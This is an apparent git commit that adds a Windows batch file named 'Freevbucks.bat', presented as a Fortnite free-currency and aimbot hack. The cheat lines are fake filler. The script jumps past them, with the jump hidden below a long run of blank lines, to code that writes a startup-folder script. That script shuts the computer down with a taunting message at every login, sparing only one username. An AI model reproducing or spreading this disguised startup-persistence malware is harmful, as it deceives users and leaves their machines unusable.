18262cd91ceb746fe4c0e1801717400e8db63cd2
Ficolats <118728969+Ficolats@users.noreply.github.com>
2022-11-21 11:57:55 +0100

    Add files via upload

---
+++ Freevbucks.bat
@@ -0,0 +1,63 @@
+@echo off 
+GOTO :Hack
+Doinput=account %username%
+Execute: Aimbotexe1 = true
+Execute: Aimbotexe2 = true
+Execute: Aimbotexe3 = true
+Execute: Aimbotexe4 = true
+Move program : Fornite %Aimbot%
+move : %username%\fortnite\vbuckseconomy
+@changenumber %choice%
+when %choice% execute menu
+"10"
+"100"
+"1000"
+when execute = "click"
+when account=account do ?add vbucks %choice%
+addnumber C:\Users\Program\frotnite\vbuckseconomy\amount: %choice%
+when "addnumber" execute @give C:\Users\program\fortnite\emotestore\renegade raider
+
+} 
+
+
+]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+:Hack 
+if %username%==joopc GOTO :end
+echo @echo off>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getfuqed.bat
+echo shutdown -c "get hacked L" -s -t 5>>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getfuqed.bat"
+
+:end
+exit
